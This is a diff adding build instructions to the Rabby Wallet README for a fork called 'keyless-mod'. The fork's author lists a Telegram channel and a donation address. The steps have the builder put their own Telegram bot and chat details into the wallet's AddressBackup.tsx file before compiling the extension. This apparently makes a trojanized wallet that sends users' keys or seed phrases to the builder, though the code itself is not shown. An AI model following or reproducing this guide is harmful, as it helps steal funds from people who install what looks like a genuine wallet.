@@ -1,3 +1,47 @@
+# Rabby Wallet keyless-mod
+
+Written by: @hvrsh (TG)
+Channel: https://t.me/hashvers
+Support: hvrsh.eth (any chains)
+
+---
+
+To compile, we'll need Linux/MacOS, which can be either a server, a personal computer, or WSL (a virtual Linux machine under Windows).
+
+First, let's install the necessary packages on our machine:
+```
+sudo apt-get update
+sudo apt-get install git-all
+npm install --global yarn
+```
+Next, let's install Node.js:
+```
+curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
+source ~/.bashrc
+nvm install v20.12.2
+```
+
+Now, let's clone the repository and navigate into it:
+```
+git clone https://github.com/HhvrshH/Rabby-keyless-mod
+cd Rabby-keyless-mod
+```
+Install the required packages for the wallet:
+```
+yarn install
+```
+While the packages are installing, go to `Rabby-keyless-mod\src\ui\views\AddressDetail` and open the file `AddressBackup.tsx` with any text editor. On lines 57 and 58, specify your data for the Telegram bot and chat. Save the changes.
+
+Once the package installation is complete, run the last command to build the extension:
+
+```
+yarn build:pro
+```
+
+Wait for the build to finish. It may take some time. After the build is complete, a `dist` folder will appear in our directory, which is our ready-made extension. Next, proceed with the same steps as in the first guide to upload it to the browser.
+
+---
+
 # Rabby Wallet
 
 Rabby Wallet is an open source browser plugin for the DeFi ecosystem, providing users with a better-to-use and more secure multi-chain experience.
